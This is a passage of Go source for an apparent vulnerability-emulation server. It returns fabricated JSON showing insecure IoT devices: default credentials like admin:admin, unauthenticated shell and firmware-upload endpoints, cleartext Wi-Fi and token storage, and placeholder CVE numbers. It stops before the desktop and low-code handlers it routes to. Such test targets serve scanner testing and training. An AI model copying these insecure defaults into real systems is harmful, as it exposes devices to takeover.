package vuln

import (
	"fmt"
	"math/rand"
	"net/http"
	"strings"
)

// ---------------------------------------------------------------------------
// Routing — OWASP IoT Top 10, Desktop App Top 10, Low-Code/No-Code Top 10
// ---------------------------------------------------------------------------

// IoTShouldHandle returns true if the path belongs to an IoT, desktop app, or
// low-code/no-code vulnerability emulation endpoint.
func (h *Handler) IoTShouldHandle(path string) bool {
	return strings.HasPrefix(path, "/vuln/iot/") ||
		strings.HasPrefix(path, "/vuln/desktop/") ||
		strings.HasPrefix(path, "/vuln/lowcode/")
}

// ServeIoT dispatches the request to the appropriate IoT, desktop, or
// low-code/no-code vulnerability handler. Returns the HTTP status code written.
func (h *Handler) ServeIoT(w http.ResponseWriter, r *http.Request) int {
	path := r.URL.Path

	switch {
	// ---- IoT Top 10 index ----
	case path == "/vuln/iot/" || path == "/vuln/iot":
		return h.serveIoTIndex(w, r)

	// ---- IoT Top 10 endpoints ----
	case strings.HasPrefix(path, "/vuln/iot/weak-passwords"):
		return h.serveIoTWeakPasswords(w, r)
	case strings.HasPrefix(path, "/vuln/iot/insecure-network"):
		return h.serveIoTInsecureNetwork(w, r)
	case strings.HasPrefix(path, "/vuln/iot/insecure-interfaces"):
		return h.serveIoTInsecureInterfaces(w, r)
	case strings.HasPrefix(path, "/vuln/iot/lack-of-update"):
		return h.serveIoTLackOfUpdate(w, r)
	case strings.HasPrefix(path, "/vuln/iot/insecure-components"):
		return h.serveIoTInsecureComponents(w, r)
	case strings.HasPrefix(path, "/vuln/iot/insufficient-privacy"):
		return h.serveIoTInsufficientPrivacy(w, r)
	case strings.HasPrefix(path, "/vuln/iot/insecure-transfer"):
		return h.serveIoTInsecureTransfer(w, r)
	case strings.HasPrefix(path, "/vuln/iot/poor-device-mgmt"):
		return h.serveIoTPoorDeviceMgmt(w, r)
	case strings.HasPrefix(path, "/vuln/iot/insecure-defaults"):
		return h.serveIoTInsecureDefaults(w, r)
	case strings.HasPrefix(path, "/vuln/iot/no-physical-hardening"):
		return h.serveIoTNoPhysicalHardening(w, r)

	// ---- Desktop App Top 10 index ----
	case path == "/vuln/desktop/" || path == "/vuln/desktop":
		return h.serveDesktopIndex(w, r)

	// ---- Desktop App Top 10 endpoints ----
	case strings.HasPrefix(path, "/vuln/desktop/injection"):
		return h.serveDesktopInjection(w, r)
	case strings.HasPrefix(path, "/vuln/desktop/broken-auth"):
		return h.serveDesktopBrokenAuth(w, r)
	case strings.HasPrefix(path, "/vuln/desktop/sensitive-data"):
		return h.serveDesktopSensitiveData(w, r)
	case strings.HasPrefix(path, "/vuln/desktop/improper-crypto"):
		return h.serveDesktopImproperCrypto(w, r)
	case strings.HasPrefix(path, "/vuln/desktop/improper-authz"):
		return h.serveDesktopImproperAuthz(w, r)
	case strings.HasPrefix(path, "/vuln/desktop/misconfig"):
		return h.serveDesktopMisconfig(w, r)
	case strings.HasPrefix(path, "/vuln/desktop/insecure-comms"):
		return h.serveDesktopInsecureComms(w, r)
	case strings.HasPrefix(path, "/vuln/desktop/poor-code-quality"):
		return h.serveDesktopPoorCodeQuality(w, r)
	case strings.HasPrefix(path, "/vuln/desktop/broken-update"):
		return h.serveDesktopBrokenUpdate(w, r)
	case strings.HasPrefix(path, "/vuln/desktop/insufficient-logging"):
		return h.serveDesktopInsufficientLogging(w, r)

	// ---- Low-Code/No-Code Top 10 index ----
	case path == "/vuln/lowcode/" || path == "/vuln/lowcode":
		return h.serveLowCodeIndex(w, r)

	// ---- Low-Code/No-Code Top 10 endpoints ----
	case strings.HasPrefix(path, "/vuln/lowcode/account-impersonation"):
		return h.serveLowCodeAccountImpersonation(w, r)
	case strings.HasPrefix(path, "/vuln/lowcode/authz-misuse"):
		return h.serveLowCodeAuthzMisuse(w, r)
	case strings.HasPrefix(path, "/vuln/lowcode/data-leakage"):
		return h.serveLowCodeDataLeakage(w, r)
	case strings.HasPrefix(path, "/vuln/lowcode/auth-failure"):
		return h.serveLowCodeAuthFailure(w, r)
	case strings.HasPrefix(path, "/vuln/lowcode/misconfig"):
		return h.serveLowCodeMisconfig(w, r)
	case strings.HasPrefix(path, "/vuln/lowcode/injection"):
		return h.serveLowCodeInjection(w, r)
	case strings.HasPrefix(path, "/vuln/lowcode/vuln-components"):
		return h.serveLowCodeVulnComponents(w, r)
	case strings.HasPrefix(path, "/vuln/lowcode/data-integrity"):
		return h.serveLowCodeDataIntegrity(w, r)
	case strings.HasPrefix(path, "/vuln/lowcode/insufficient-logging"):
		return h.serveLowCodeInsufficientLogging(w, r)
	case strings.HasPrefix(path, "/vuln/lowcode/security-gap"):
		return h.serveLowCodeSecurityGap(w, r)
	}

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.WriteHeader(http.StatusNotFound)
	fmt.Fprint(w, h.wrapHTML("Not Found", "<p>Unknown IoT/desktop/low-code vulnerability demo path.</p>"))
	return http.StatusNotFound
}

// ---------------------------------------------------------------------------
// Index pages
// ---------------------------------------------------------------------------

func (h *Handler) serveIoTIndex(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	body := `<h2>OWASP IoT Top 10 (2018)</h2>
<p>IoT device vulnerability emulations. Endpoints return JSON resembling IoT device API responses.</p>
<ul>
  <li><a href="/vuln/iot/weak-passwords">I1 - Weak, Guessable, or Hardcoded Passwords</a> — device admin panel with admin:admin, root:root</li>
  <li><a href="/vuln/iot/insecure-network">I2 - Insecure Network Services</a> — Telnet enabled, no TLS, open ports</li>
  <li><a href="/vuln/iot/insecure-interfaces">I3 - Insecure Ecosystem Interfaces</a> — web API with no auth, CORS *, no rate limits</li>
  <li><a href="/vuln/iot/lack-of-update">I4 - Lack of Secure Update Mechanism</a> — firmware v1.0.0 from 2019, no OTA</li>
  <li><a href="/vuln/iot/insecure-components">I5 - Use of Insecure or Outdated Components</a> — BusyBox 1.25, OpenSSL 1.0.2, Linux 3.x</li>
  <li><a href="/vuln/iot/insufficient-privacy">I6 - Insufficient Privacy Protection</a> — telemetry with PII to analytics.iot-vendor.com</li>
  <li><a href="/vuln/iot/insecure-transfer">I7 - Insecure Data Transfer and Storage</a> — MQTT without TLS, HTTP firmware download</li>
  <li><a href="/vuln/iot/poor-device-mgmt">I8 - Lack of Device Management</a> — fleet with 5000 unpatched devices, no inventory</li>
  <li><a href="/vuln/iot/insecure-defaults">I9 - Insecure Default Settings</a> — UPnP enabled, WPS on, debug UART active</li>
  <li><a href="/vuln/iot/no-physical-hardening">I10 - Lack of Physical Hardening</a> — exposed JTAG, no tamper detection</li>
</ul>`
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, h.wrapHTML("OWASP IoT Top 10 (2018)", body))
	return http.StatusOK
}

func (h *Handler) serveDesktopIndex(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	body := `<h2>OWASP Desktop App Top 10 (2021)</h2>
<p>Desktop application vulnerability emulations. Endpoints return JSON resembling desktop application metadata and config dumps.</p>
<ul>
  <li><a href="/vuln/desktop/injection">DA1 - Injection</a> — DLL search order hijack paths</li>
  <li><a href="/vuln/desktop/broken-auth">DA2 - Broken Authentication</a> — plaintext license key validation</li>
  <li><a href="/vuln/desktop/sensitive-data">DA3 - Sensitive Data Exposure</a> — cleartext SQLite passwords in app data</li>
  <li><a href="/vuln/desktop/improper-crypto">DA4 - Improper Cryptography</a> — XOR "encryption" with hardcoded key</li>
  <li><a href="/vuln/desktop/improper-authz">DA5 - Improper Authorization</a> — registry entries with admin bypass flag</li>
  <li><a href="/vuln/desktop/misconfig">DA6 - Security Misconfiguration</a> — debug=true, no code signing</li>
  <li><a href="/vuln/desktop/insecure-comms">DA7 - Insecure Communication</a> — HTTP API calls, no certificate pinning</li>
  <li><a href="/vuln/desktop/poor-code-quality">DA8 - Poor Code Quality</a> — crash dump with buffer overflow stack trace</li>
  <li><a href="/vuln/desktop/broken-update">DA9 - Using Components with Known Vulnerabilities</a> — update over HTTP, no signature</li>
  <li><a href="/vuln/desktop/insufficient-logging">DA10 - Insufficient Logging and Monitoring</a> — no event log, no crash reporting</li>
</ul>`
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, h.wrapHTML("OWASP Desktop App Top 10 (2021)", body))
	return http.StatusOK
}

func (h *Handler) serveLowCodeIndex(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	body := `<h2>OWASP Low-Code/No-Code Top 10 (2022)</h2>
<p>Low-code/no-code platform vulnerability emulations. Endpoints return JSON resembling platform API responses (Power Automate / Zapier style).</p>
<ul>
  <li><a href="/vuln/lowcode/account-impersonation">LC1 - Account Impersonation</a> — workflow running as service account with user permissions</li>
  <li><a href="/vuln/lowcode/authz-misuse">LC2 - Authorization Misuse</a> — shared connection allowing admin API access</li>
  <li><a href="/vuln/lowcode/data-leakage">LC3 - Data Leakage</a> — full PII in workflow execution history</li>
  <li><a href="/vuln/lowcode/auth-failure">LC4 - Authentication Failure</a> — public form connected to internal DB without auth</li>
  <li><a href="/vuln/lowcode/misconfig">LC5 - Security Misconfiguration</a> — anonymous sharing, no IP restrictions</li>
  <li><a href="/vuln/lowcode/injection">LC6 - Injection Handling Failure</a> — formula injection in spreadsheet workflow</li>
  <li><a href="/vuln/lowcode/vuln-components">LC7 - Vulnerable/Untrusted Components</a> — marketplace connector with known CVE</li>
  <li><a href="/vuln/lowcode/data-integrity">LC8 - Data and Secret Handling Failure</a> — no input validation, accepts any payload</li>
  <li><a href="/vuln/lowcode/insufficient-logging">LC9 - Asset Management Failure</a> — 7-day log retention, no alerts</li>
  <li><a href="/vuln/lowcode/security-gap">LC10 - Security Logging and Monitoring Failure</a> — workflow bypassing enterprise controls</li>
</ul>`
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, h.wrapHTML("OWASP Low-Code/No-Code Top 10 (2022)", body))
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// IoT helpers
// ---------------------------------------------------------------------------

func (h *Handler) iotJSON(w http.ResponseWriter, rng *rand.Rand, status int, body string) int {
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("X-Device-Type", []string{"smart-hub", "ip-camera", "thermostat", "smart-lock", "sensor-gateway"}[rng.Intn(5)])
	w.Header().Set("X-Firmware-Version", fmt.Sprintf("%d.%d.%d", rng.Intn(3)+1, rng.Intn(10), rng.Intn(20)))
	w.Header().Set("X-Device-ID", fmt.Sprintf("IOT-%s", h.randomHex(rng, 12)))
	w.WriteHeader(status)
	fmt.Fprint(w, body)
	return status
}

func (h *Handler) desktopJSON(w http.ResponseWriter, rng *rand.Rand, status int, body string) int {
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("X-App-Name", []string{"AcmeEditor", "GlobexSync", "InitechManager", "UmbraTools", "NexusClient"}[rng.Intn(5)])
	w.Header().Set("X-App-Version", fmt.Sprintf("%d.%d.%d", rng.Intn(5)+1, rng.Intn(20), rng.Intn(100)))
	w.Header().Set("X-Platform", []string{"Windows", "macOS", "Linux"}[rng.Intn(3)])
	w.WriteHeader(status)
	fmt.Fprint(w, body)
	return status
}

func (h *Handler) lowcodeJSON(w http.ResponseWriter, rng *rand.Rand, status int, body string) int {
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("X-Platform", []string{"PowerAutomate", "Zapier", "Integromat", "AppSheet", "Retool"}[rng.Intn(5)])
	w.Header().Set("X-Workflow-Engine", fmt.Sprintf("engine-%s", h.randomHex(rng, 6)))
	w.Header().Set("X-Tenant-ID", fmt.Sprintf("tenant_%s", h.randomHex(rng, 8)))
	w.WriteHeader(status)
	fmt.Fprint(w, body)
	return status
}

// ---------------------------------------------------------------------------
// I1: Weak, Guessable, or Hardcoded Passwords
// ---------------------------------------------------------------------------

func (h *Handler) serveIoTWeakPasswords(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "iot-weak-passwords")

	macAddr := fmt.Sprintf("%02x:%02x:%02x:%02x:%02x:%02x",
		rng.Intn(256), rng.Intn(256), rng.Intn(256),
		rng.Intn(256), rng.Intn(256), rng.Intn(256))

	resp := toJSON(map[string]interface{}{
		"device": map[string]interface{}{
			"model":    "SmartHub Pro X1",
			"mac":      macAddr,
			"firmware": "1.0.0-build.2019.03",
			"uptime":   fmt.Sprintf("%d days", rng.Intn(800)+30),
		},
		"admin_panel": map[string]interface{}{
			"url":      "http://192.168.1.1:8080/admin",
			"protocol": "HTTP",
			"tls":      false,
		},
		"credentials": []map[string]interface{}{
			{"username": "admin", "password": "admin", "role": "administrator", "last_login": "2024-12-01T08:32:00Z"},
			{"username": "root", "password": "root", "role": "superuser", "last_login": "2024-11-15T14:20:00Z"},
			{"username": "user", "password": "user", "role": "viewer", "last_login": "2024-10-22T09:45:00Z"},
			{"username": "service", "password": "service123", "role": "api", "last_login": "2024-12-10T22:00:00Z"},
			{"username": "debug", "password": "debug", "role": "developer", "last_login": "2023-06-01T00:00:00Z"},
		},
		"password_policy": map[string]interface{}{
			"min_length":        0,
			"require_uppercase": false,
			"require_numbers":   false,
			"require_special":   false,
			"max_attempts":      0,
			"lockout_enabled":   false,
			"change_on_setup":   false,
		},
		"_warning": "All default credentials are active and cannot be changed via the web interface",
	})
	return h.iotJSON(w, rng, http.StatusOK, resp)
}

// ---------------------------------------------------------------------------
// I2: Insecure Network Services
// ---------------------------------------------------------------------------

func (h *Handler) serveIoTInsecureNetwork(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "iot-insecure-network")

	resp := toJSON(map[string]interface{}{
		"device_id": fmt.Sprintf("IOT-%s", h.randomHex(rng, 8)),
		"hostname":  fmt.Sprintf("iot-gateway-%s", h.randomHex(rng, 4)),
		"network_config": map[string]interface{}{
			"ip_address":  fmt.Sprintf("192.168.%d.%d", rng.Intn(10)+1, rng.Intn(254)+1),
			"subnet_mask": "255.255.255.0",
			"gateway":     "192.168.1.1",
			"dns":         "8.8.8.8",
		},
		"services": []map[string]interface{}{
			{"port": 23, "protocol": "Telnet", "enabled": true, "tls": false, "auth": "none", "description": "Remote management shell"},
			{"port": 80, "protocol": "HTTP", "enabled": true, "tls": false, "auth": "basic", "description": "Web admin interface"},
			{"port": 21, "protocol": "FTP", "enabled": true, "tls": false, "auth": "anonymous", "description": "Firmware upload"},
			{"port": 161, "protocol": "SNMPv1", "enabled": true, "tls": false, "auth": "community=public", "description": "Device monitoring"},
			{"port": 1883, "protocol": "MQTT", "enabled": true, "tls": false, "auth": "none", "description": "Sensor data broker"},
			{"port": 502, "protocol": "Modbus", "enabled": true, "tls": false, "auth": "none", "description": "Industrial control"},
			{"port": 8443, "protocol": "HTTPS", "enabled": false, "tls": true, "auth": "token", "description": "Secure API (disabled)"},
		},
		"firewall": map[string]interface{}{
			"enabled":       false,
			"default_policy": "ACCEPT",
			"rules":         []string{},
		},
		"tls_config": map[string]interface{}{
			"enabled":             false,
			"certificate":         "none",
			"min_version":         "not configured",
			"client_verification": false,
		},
		"_warning": "Telnet enabled with no encryption. All ports exposed to LAN. No firewall rules configured.",
	})
	return h.iotJSON(w, rng, http.StatusOK, resp)
}

// ---------------------------------------------------------------------------
// I3: Insecure Ecosystem Interfaces
// ---------------------------------------------------------------------------

func (h *Handler) serveIoTInsecureInterfaces(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "iot-insecure-interfaces")

	resp := toJSON(map[string]interface{}{
		"api_endpoint": fmt.Sprintf("http://iot-hub-%s.local:8080/api/v1", h.randomHex(rng, 4)),
		"api_config": map[string]interface{}{
			"authentication":  "none",
			"cors_origin":     "*",
			"cors_methods":    "GET, POST, PUT, DELETE, OPTIONS",
			"cors_credentials": true,
			"rate_limiting": map[string]interface{}{
				"enabled":      false,
				"max_requests": 0,
				"window":       "unlimited",
			},
			"input_validation": false,
			"csrf_protection":  false,
		},
		"exposed_endpoints": []map[string]interface{}{
			{"method": "GET", "path": "/api/v1/devices", "auth": "none", "description": "List all connected devices"},
			{"method": "GET", "path": "/api/v1/config", "auth": "none", "description": "Full device configuration"},
			{"method": "POST", "path": "/api/v1/firmware/upload", "auth": "none", "description": "Upload new firmware"},
			{"method": "POST", "path": "/api/v1/factory-reset", "auth": "none", "description": "Reset to factory defaults"},
			{"method": "GET", "path": "/api/v1/users", "auth": "none", "description": "List all user accounts"},
			{"method": "DELETE", "path": "/api/v1/logs", "auth": "none", "description": "Clear all device logs"},
			{"method": "POST", "path": "/api/v1/exec", "auth": "none", "description": "Execute shell command on device"},
		},
		"mobile_app_integration": map[string]interface{}{
			"api_key_in_url":     true,
			"hardcoded_token":    fmt.Sprintf("Bearer iot_%s", h.randomHex(rng, 32)),
			"ssl_pinning":       false,
			"certificate_check": false,
		},
		"_warning": "No authentication on any API endpoint. CORS allows all origins with credentials.",
	})
	return h.iotJSON(w, rng, http.StatusOK, resp)
}

// ---------------------------------------------------------------------------
// I4: Lack of Secure Update Mechanism
// ---------------------------------------------------------------------------

func (h *Handler) serveIoTLackOfUpdate(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "iot-lack-of-update")

	resp := toJSON(map[string]interface{}{
		"device_id": fmt.Sprintf("IOT-%s", h.randomHex(rng, 8)),
		"firmware": map[string]interface{}{
			"current_version": "1.0.0",
			"build_date":      "2019-03-15",
			"last_update":     "never",
			"auto_update":     false,
			"ota_enabled":     false,
			"ota_url":         "",
		},
		"update_mechanism": map[string]interface{}{
			"method":                "manual USB only",
			"signature_verification": false,
			"encrypted_transport":    false,
			"rollback_support":       false,
			"integrity_check":        "none",
			"download_url":           fmt.Sprintf("http://firmware.iot-vendor.com/updates/%s/latest.bin", h.randomHex(rng, 8)),
		},
		"known_vulnerabilities": []map[string]interface{}{
			{"cve": "CVE-2020-12345", "severity": "critical", "description": "Remote code execution via Telnet", "patched": false},
			{"cve": "CVE-2021-67890", "severity": "high", "description": "Authentication bypass in web interface", "patched": false},
			{"cve": "CVE-2022-11111", "severity": "high", "description": "Buffer overflow in MQTT handler", "patched": false},
			{"cve": "CVE-2023-22222", "severity": "medium", "description": "Information disclosure via SNMP", "patched": false},
		},
		"vendor_support": map[string]interface{}{
			"status":          "end-of-life",
			"support_ended":   "2021-12-31",
			"security_updates": false,
			"contact":          "support@iot-vendor.com (unmonitored)",
		},
		"_warning": "Firmware has not been updated since initial deployment in 2019. No OTA capability. 4 unpatched CVEs.",
	})
	return h.iotJSON(w, rng, http.StatusOK, resp)
}

// ---------------------------------------------------------------------------
// I5: Use of Insecure or Outdated Components
// ---------------------------------------------------------------------------

func (h *Handler) serveIoTInsecureComponents(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "iot-insecure-components")

	resp := toJSON(map[string]interface{}{
		"device_id": fmt.Sprintf("IOT-%s", h.randomHex(rng, 8)),
		"bill_of_materials": []map[string]interface{}{
			{"component": "BusyBox", "version": "1.25.0", "latest": "1.36.1", "cves": 14, "severity": "critical"},
			{"component": "OpenSSL", "version": "1.0.2k", "latest": "3.2.1", "cves": 47, "severity": "critical"},
			{"component": "Linux Kernel", "version": "3.18.140", "latest": "6.7.2", "cves": 312, "severity": "critical"},
			{"component": "uClibc", "version": "0.9.33", "latest": "1.0.45", "cves": 8, "severity": "high"},
			{"component": "lighttpd", "version": "1.4.35", "latest": "1.4.73", "cves": 6, "severity": "high"},
			{"component": "dropbear", "version": "2016.74", "latest": "2024.84", "cves": 5, "severity": "medium"},
			{"component": "dnsmasq", "version": "2.75", "latest": "2.90", "cves": 11, "severity": "critical"},
			{"component": "libcurl", "version": "7.47.0", "latest": "8.5.0", "cves": 38, "severity": "high"},
		},
		"scan_summary": map[string]interface{}{
			"total_components":   8,
			"outdated":           8,
			"critical_cves":      4,
			"high_cves":          3,
			"total_known_cves":   441,
			"last_scan":          "2024-12-15T09:00:00Z",
			"sbom_available":     false,
			"vendor_advisories":  0,
		},
		"build_info": map[string]interface{}{
			"toolchain":     "gcc 4.9.3 (obsolete)",
			"build_date":    "2019-03-15",
			"debug_symbols": true,
			"strip":         false,
			"aslr":          false,
			"stack_canary":  false,
		},
		"_warning": "All components severely outdated. 441 known CVEs across the firmware. No SBOM available.",
	})
	return h.iotJSON(w, rng, http.StatusOK, resp)
}

// ---------------------------------------------------------------------------
// I6: Insufficient Privacy Protection
// ---------------------------------------------------------------------------

func (h *Handler) serveIoTInsufficientPrivacy(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "iot-insufficient-privacy")

	userName := h.firstNames[rng.Intn(len(h.firstNames))] + " " + h.lastNames[rng.Intn(len(h.lastNames))]
	userEmail := h.randomEmail(rng)

	resp := toJSON(map[string]interface{}{
		"device_id": fmt.Sprintf("IOT-%s", h.randomHex(rng, 8)),
		"telemetry_config": map[string]interface{}{
			"enabled":      true,
			"endpoint":     "http://analytics.iot-vendor.com/collect",
			"protocol":     "HTTP",
			"encrypted":    false,
			"opt_out":      false,
			"consent_required": false,
			"frequency":    "every 30 seconds",
		},
		"collected_data": map[string]interface{}{
			"device_info": map[string]interface{}{
				"mac_address":     fmt.Sprintf("%02x:%02x:%02x:%02x:%02x:%02x", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256)),
				"serial_number":   fmt.Sprintf("SN-%s", h.randomHex(rng, 12)),
				"wifi_ssid":       fmt.Sprintf("HOME-%s", h.randomHex(rng, 4)),
				"wifi_bssid":      fmt.Sprintf("%02x:%02x:%02x:%02x:%02x:%02x", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256)),
				"public_ip":       fmt.Sprintf("%d.%d.%d.%d", rng.Intn(223)+1, rng.Intn(256), rng.Intn(256), rng.Intn(256)),
			},
			"user_pii": map[string]interface{}{
				"owner_name":     userName,
				"owner_email":    userEmail,
				"home_address":   fmt.Sprintf("%d %s St, Apt %d", rng.Intn(9000)+100, h.lastNames[rng.Intn(len(h.lastNames))], rng.Intn(20)+1),
				"phone_number":   fmt.Sprintf("+1-%03d-%03d-%04d", rng.Intn(900)+100, rng.Intn(900)+100, rng.Intn(10000)),
				"gps_location": map[string]interface{}{
					"latitude":  fmt.Sprintf("%.6f", float64(rng.Intn(180)-90)+rng.Float64()),
					"longitude": fmt.Sprintf("%.6f", float64(rng.Intn(360)-180)+rng.Float64()),
				},
			},
			"usage_patterns": map[string]interface{}{
				"daily_active_hours":  rng.Intn(18) + 4,
				"occupancy_detected":  true,
				"rooms_with_activity": []string{"living_room", "bedroom", "kitchen"},
				"sleep_schedule":      "22:30-06:15",
				"away_from_home":      false,
			},
		},
		"third_party_sharing": []map[string]interface{}{
			{"partner": "analytics.iot-vendor.com", "data_types": []string{"device_info", "usage_patterns", "location"}, "consent": false},
			{"partner": "ads.partnercorp.com", "data_types": []string{"user_pii", "usage_patterns"}, "consent": false},
			{"partner": "data-broker.example.com", "data_types": []string{"all"}, "consent": false},
		},
		"privacy_policy": map[string]interface{}{
			"url":             "http://iot-vendor.com/privacy",
			"last_updated":    "2018-01-15",
			"gdpr_compliant":  false,
			"ccpa_compliant":  false,
			"data_deletion":   false,
			"data_export":     false,
		},
		"_warning": "Device sends PII including home address and GPS to unencrypted HTTP endpoint. No opt-out. Shared with 3 third parties without consent.",
	})
	return h.iotJSON(w, rng, http.StatusOK, resp)
}

// ---------------------------------------------------------------------------
// I7: Insecure Data Transfer and Storage
// ---------------------------------------------------------------------------

func (h *Handler) serveIoTInsecureTransfer(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "iot-insecure-transfer")

	resp := toJSON(map[string]interface{}{
		"device_id": fmt.Sprintf("IOT-%s", h.randomHex(rng, 8)),
		"mqtt_broker": map[string]interface{}{
			"host":           fmt.Sprintf("mqtt.iot-hub-%s.local", h.randomHex(rng, 4)),
			"port":           1883,
			"tls_enabled":    false,
			"authentication": "none",
			"client_id":      fmt.Sprintf("device_%s", h.randomHex(rng, 8)),
			"topics": []string{
				"home/sensors/+/temperature",
				"home/sensors/+/humidity",
				"home/cameras/+/stream",
				"home/locks/+/status",
				"home/users/+/presence",
			},
			"retained_messages": true,
			"qos":              0,
		},
		"firmware_update": map[string]interface{}{
			"url":            fmt.Sprintf("http://firmware.iot-vendor.com/v1/%s/latest.bin", h.randomHex(rng, 8)),
			"protocol":       "HTTP",
			"tls":            false,
			"checksum":       "none",
			"signature":      "none",
			"size_bytes":     rng.Intn(50000000) + 10000000,
		},
		"local_storage": map[string]interface{}{
			"wifi_credentials": map[string]interface{}{
				"file":      "/etc/wifi.conf",
				"encrypted": false,
				"format":    "plaintext",
				"content":   fmt.Sprintf("ssid=HOME-%s\npassword=%s\n", h.randomHex(rng, 4), h.randomHex(rng, 12)),
			},
			"api_tokens": map[string]interface{}{
				"file":      "/etc/cloud_tokens",
				"encrypted": false,
				"content":   fmt.Sprintf("cloud_api_key=%s\nrefresh_token=%s\n", h.randomHex(rng, 32), h.randomHex(rng, 48)),
			},
			"user_data": map[string]interface{}{
				"file":      "/var/data/users.db",
				"encrypted": false,
				"format":    "SQLite (cleartext)",
			},
		},
		"data_in_transit": map[string]interface{}{
			"sensor_data":    "HTTP (unencrypted)",
			"camera_stream":  "RTSP (unencrypted)",
			"command_channel": "TCP raw socket (unencrypted)",
			"cloud_sync":     "HTTP (unencrypted)",
		},
		"_warning": "MQTT broker has no TLS or authentication. Firmware downloads over plain HTTP. WiFi credentials stored in cleartext.",
	})
	return h.iotJSON(w, rng, http.StatusOK, resp)
}

// ---------------------------------------------------------------------------
// I8: Lack of Device Management
// ---------------------------------------------------------------------------

func (h *Handler) serveIoTPoorDeviceMgmt(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "iot-poor-device-mgmt")

	devices := []map[string]interface{}{}
	statuses := []string{"online", "online", "offline", "online", "degraded", "online", "unknown"}
	fwVersions := []string{"1.0.0", "1.0.0", "1.0.1", "0.9.8", "1.0.0", "0.9.5", "1.0.0"}
	for i := 0; i < 12; i++ {
		devices = append(devices, map[string]interface{}{
			"device_id":   fmt.Sprintf("IOT-%s", h.randomHex(rng, 6)),
			"model":       []string{"SmartHub X1", "ThermoSense v2", "CamGuard Pro", "DoorLock Z", "SensorNode A1"}[rng.Intn(5)],
			"firmware":    fwVersions[rng.Intn(len(fwVersions))],
			"status":      statuses[rng.Intn(len(statuses))],
			"last_seen":   fmt.Sprintf("2024-%02d-%02dT%02d:%02d:00Z", rng.Intn(12)+1, rng.Intn(28)+1, rng.Intn(24), rng.Intn(60)),
			"location":    []string{"Building A", "Building B", "Warehouse", "Office Floor 3", "Unknown"}[rng.Intn(5)],
			"owner":       "unassigned",
			"patched":     false,
		})
	}

	resp := toJSON(map[string]interface{}{
		"fleet_summary": map[string]interface{}{
			"total_devices":     5000,
			"online":            3247,
			"offline":           1298,
			"degraded":          312,
			"unknown":           143,
			"firmware_current":  0,
			"firmware_outdated": 5000,
			"unpatched":         5000,
			"last_audit":        "never",
		},
		"inventory": map[string]interface{}{
			"asset_tracking":    false,
			"serial_registry":   false,
			"location_mapping":  false,
			"ownership_records": false,
			"decommission_process": "none",
		},
		"management_capabilities": map[string]interface{}{
			"remote_update":     false,
			"remote_wipe":       false,
			"remote_config":     false,
			"health_monitoring": false,
			"alerting":          false,
			"centralized_logs":  false,
		},
		"sample_devices": devices,
		"_warning": "5000 devices deployed with no inventory system, no remote management, and all running outdated firmware.",
	})
	return h.iotJSON(w, rng, http.StatusOK, resp)
}

// ---------------------------------------------------------------------------
// I9: Insecure Default Settings
// ---------------------------------------------------------------------------

func (h *Handler) serveIoTInsecureDefaults(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "iot-insecure-defaults")

	resp := toJSON(map[string]interface{}{
		"device_id": fmt.Sprintf("IOT-%s", h.randomHex(rng, 8)),
		"model":     "SmartHub Pro X1",
		"factory_config": map[string]interface{}{
			"upnp_enabled":        true,
			"wps_enabled":         true,
			"debug_uart_active":   true,
			"telnet_enabled":      true,
			"ssh_root_login":      true,
			"remote_access":       true,
			"cloud_reporting":     true,
			"auto_pair":           true,
			"broadcast_ssid":      true,
		},
		"network_defaults": map[string]interface{}{
			"admin_port":       8080,
			"protocol":         "HTTP",
			"firewall":         "disabled",
			"dns_rebinding_protection": false,
			"upnp_port_mapping": true,
			"multicast_dns":    true,
		},
		"credential_defaults": map[string]interface{}{
			"admin_username":  "admin",
			"admin_password":  "admin",
			"wifi_password":   "12345678",
			"api_key":         "default-api-key-do-not-use",
			"encryption_key":  "0000000000000000",
		},
		"debug_interfaces": map[string]interface{}{
			"uart": map[string]interface{}{
				"enabled":   true,
				"baud_rate": 115200,
				"auth":      false,
				"shell":     "root",
			},
			"jtag": map[string]interface{}{
				"enabled":   true,
				"protected": false,
			},
			"swd": map[string]interface{}{
				"enabled":   true,
				"locked":    false,
			},
		},
		"setup_wizard": map[string]interface{}{
			"force_password_change": false,
			"security_checklist":    false,
			"disable_unused_services": false,
			"network_segmentation_hint": false,
		},
		"_warning": "UPnP, WPS, Telnet, debug UART all enabled by default. Default credentials never force a change.",
	})
	return h.iotJSON(w, rng, http.StatusOK, resp)
}

// ---------------------------------------------------------------------------
// I10: Lack of Physical Hardening
